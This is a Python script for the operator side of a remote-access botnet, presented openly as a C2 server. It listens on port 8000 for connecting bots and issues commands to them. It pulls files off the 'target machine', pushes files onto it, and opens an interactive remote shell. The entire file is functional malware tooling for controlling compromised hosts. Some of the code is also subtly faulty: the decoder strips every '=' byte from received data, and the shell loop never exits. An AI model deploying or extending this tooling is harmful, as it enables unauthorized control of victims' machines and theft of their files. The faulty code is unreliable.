#!/usr/bin/env python3

import socket, base64, sys, time

def base64_decode(data):
    """This function removes the delimter from the encoded data as well as the padding
    Args:
        data (bytes): The encoded data
    Returns:
        _type_: bytes
    """
    # Establish the delimiter
    delim = b'!!#@'
    # Remove the delimiter
    data = data.split(delim)[0]
    # Remove the padding and return the decoded data
    return base64.b64decode(data).replace(b'=', b'')

def base64_encode(data):
    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
    Args:
        data (_type_:bytes): The data to encode
    Returns:
        _type_: bytes
    """
    
    delim = b'!!#@'
    if len(data) % 4 != 0:
        data += b'=' * (4 - (len(data) % 4))
    return base64.b64encode(data) + delim


def input_validator(input_prompt):
    output = ""
    while output == "":
        output = input(input_prompt)
    return output
    

def command_input(os_type):
    """This function takes the user input and returns it, will not proceed until the user enters a command
    if the user enters quit, the program will exit
    if the user enters download, the user will be prompted to enter a file name, the file will be downloaded to the current directory
    Returns:
        _type_: str
    """
    # Ask the user for a command
    command = ""
    file_name = ""
    file_destination = ""
    # While loop to make sure the user enters a command
    while command == "":
        command = input(os_type + " > ")
        # Check to see if the user entered download
        if command.lower() == "download":
            # Ask the user for a file name
            while file_name == "":
                file_name = input("Enter the file's absolute path> ")
        elif command.lower() == 'upload':
            while file_name == "":
                file_name = input("Enter the file's absolute path> ")
                file_destination = input("Enter the destination path> ")
            # file_name = input_validator("Enter the file's absolute path> ")
    # Return the command and file name
    return command, file_name, file_destination

def download_file(socket, file_name, command="download"):
    """This function downloads a file from the target machine
    Args:
        socket (_type_): The socket to receive data from
        file_name (_type_): The name of the file to download
    """
    # Bot is looking for command in specific format
    command = command + " " + file_name
    # Send the command to the bot
    socket.send(command.encode())
    # Receive the data from the bot
    full_file = receive_data(socket)
    # The bot will send a message if the file does not exist
    if base64_decode(full_file) == b"[-] File not found":
        print("\nFile not found\n")
        return
    # Write the file to directory the user chooses
    else:
        file_out_location = input("Where would you like to save the file? ")
        with open(file_out_location, 'wb') as f:
            f.write(base64_decode(full_file))

def upload_file(socket, file_name, file_destination, command="upload"):
    """This function uploads a file to the target machine
    Args:
        socket (_type_): The socket to send data to
        file_name (_type_): The name of the file to upload
    """
    # Bot is looking for command in specific format
    command = command + " " + file_name + " " + file_destination
    # Send the command to the bot
    socket.send(command.encode())
    # Read the file into memory
    with open(file_name, 'rb') as f:
        file_data = f.read()
        file_data = base64_encode(file_data)
        socket.sendall(file_data)
    # Encode the file data
    # TODO: Add error handling for file not found

def send_file(socket, file_name, file_destination, command="upload"):
    """This function sends a file to the C2 server
    Args:
        socket (_type_): The socket to send data to
        file_name (_type_): The name of the file to send
    """
    try:
        with open(file_name, "rb") as f:
            data = f.read()
            data = base64_encode(data)
            socket.sendall(data)
    except:
        socket.sendall(base64_encode(b"[-] File not found"))

def receive_data(socket):
    """This function receives the data from the socket and returns it
    Args:
        socket (_type_): The socket to receive data from
    Returns:
        _type_: bytes
    """
    # Create a list to hold the fragments of data, dramatically increases speed
    fragments = []
    # While loop to receive the data
    while True:
        # Each fragment is 4096 bytes
        chunk = socket.recv(4096)
        # If the length of the chunk is less than 4096, we have received all the data
        if  len(chunk) < 4096:
            # Append the last chunk to the list and break out of the loop
            fragments.append(chunk)
            break
        # Append the chunk to the list
        fragments.append(chunk)
    full_data = b''.join(fragments)
    return full_data

def main():
    c2_server = socket.socket()
    c2_server.bind(("0.0.0.0", 8000))
    print("Listening on port 8000")
    c2_server.listen(1)
    while True:
        # Accept the connection
        client, address = c2_server.accept()
        # Print the address of the client
        print(f"Connection from {address} has been established!")
        # While loop to keep the connection open
        os_family = receive_data(client)
        os_family = base64_decode(os_family)
        os_family = os_family.decode()
        running_directory = receive_data(client)
        running_directory = base64_decode(running_directory)
        running_directory = running_directory.decode()
        user_continue = True
        while user_continue:
            # Get the command from the user
            command, file_name, file_destination = command_input(os_family)
            # Check to see if the user entered download menu
            if command.lower() == "download":
                download_file(client, file_name)
            elif command.lower() == "upload":
                upload_file(client, file_name, file_destination)
            # Check to see if the user entered quit
            else:
                client.send(command.encode())
                if command.lower() == "shell":
                    while True:
                        full_data = client.recv(4096).decode()
                        sys.stdout.write(full_data)
                        command = input()

                        #Send the command to the bot
                        command += "\n"
                        client.send(command.encode())
                        time.sleep(1)

                        #Remove the output of the 'input' function
                        sys.stdout.write("\033[A" + full_data.split("\n")[-1])

                if command.lower() == "quit":
                    user_continue = False
                # Receive the data from the bot
                full_data = receive_data(client)
                decoded_data = base64_decode(full_data)
                print(decoded_data.decode())
        client.close()
        exit()

main()